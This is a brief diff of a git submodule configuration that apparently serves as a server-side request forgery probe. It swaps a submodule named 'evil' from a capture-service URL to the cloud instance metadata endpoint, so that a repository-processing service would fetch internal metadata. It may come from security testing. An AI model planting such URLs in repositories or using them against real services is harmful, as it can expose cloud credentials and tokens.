@@ -1,3 +1,3 @@
 [submodule "evil"]
 	path = evil
-	url = https://parser-s0-capture-piafv24i3q-uc.a.run.app/s0w11c-submodule.git
+	url = http://169.254.169.254/computeMetadata/v1/
